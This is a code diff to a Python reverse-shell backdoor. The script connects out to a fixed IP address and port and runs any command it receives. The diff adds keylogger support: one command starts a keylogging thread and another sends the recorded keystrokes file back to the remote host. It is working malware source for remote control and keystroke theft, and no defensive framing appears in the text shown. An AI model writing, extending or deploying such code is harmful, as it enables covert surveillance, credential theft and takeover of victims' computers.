@@ -4,6 +4,8 @@ import os
 import subprocess
 import json
 import base64
+import threading
+import keylogger
 
 def reliable_send(data):
     json_data = json.dumps(data)
@@ -39,11 +41,19 @@ def shell():
             except:
                 failed = "Failed to uplaod file\n"
                 reliable_send(failed)
+        elif command[:12] == "keylog_start":
+            t1 = threading.Thread(target=keylogger.start)
+            t1.start()
+        elif command[:11] == "keylog_dump":
+            fn = open(keylogger_path, "r")
+            reliable_send(fn.read())
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
             reliable_send(result)
+
+keylogger_path = os.getcwd() + "/keystrokes.txt"
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("10.0.0.74", 54321))
